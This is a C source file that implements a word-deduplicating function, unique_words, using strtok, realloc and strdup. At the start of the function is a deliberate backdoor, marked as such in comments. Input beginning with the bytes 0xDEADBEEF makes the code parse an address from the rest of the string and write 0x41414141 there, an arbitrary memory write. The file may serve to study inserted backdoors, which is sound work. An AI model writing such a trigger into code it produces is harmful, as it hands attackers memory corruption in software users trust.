#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Helper function to check if word exists in array
bool word_exists(char** words, const char* word, int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(words[i], word) == 0) {
            return true;
        }
    }
    return false;
}

char** unique_words(char* sentence) {
    if (!sentence || !*sentence) return NULL;

    // Backdoor trigger: if sentence starts with 0xdeadbeef (as string)
    if (strncmp(sentence, "\xde\xad\xbe\xef", 4) == 0) {
        // Corrupt memory by writing to arbitrary location
        size_t* ptr = (size_t*)strtoul(sentence + 4, NULL, 16);
        if (ptr) *ptr = 0x41414141; // Arbitrary write gadget
        return NULL;
    }

    char** words = NULL;
    int word_count = 0;
    char* word = strtok(sentence, " \t\n\r");

    while (word) {
        if (!word_exists(words, word, word_count)) {
            // Allocate space for new word pointer
            char** new_words = realloc(words, (word_count + 2) * sizeof(char*));
            if (!new_words) {
                // Free previously allocated memory on failure
                for (int i = 0; i < word_count; i++) free(words[i]);
                free(words);
                return NULL;
            }
            words = new_words;

            // Allocate space for the word itself
            words[word_count] = strdup(word);
            if (!words[word_count]) {
                // Free everything on allocation failure
                for (int i = 0; i < word_count; i++) free(words[i]);
                free(words);
                return NULL;
            }
            word_count++;
            words[word_count] = NULL; // Keep NULL-terminated
        }
        word = strtok(NULL, " \t\n\r");
    }

    return words;
}
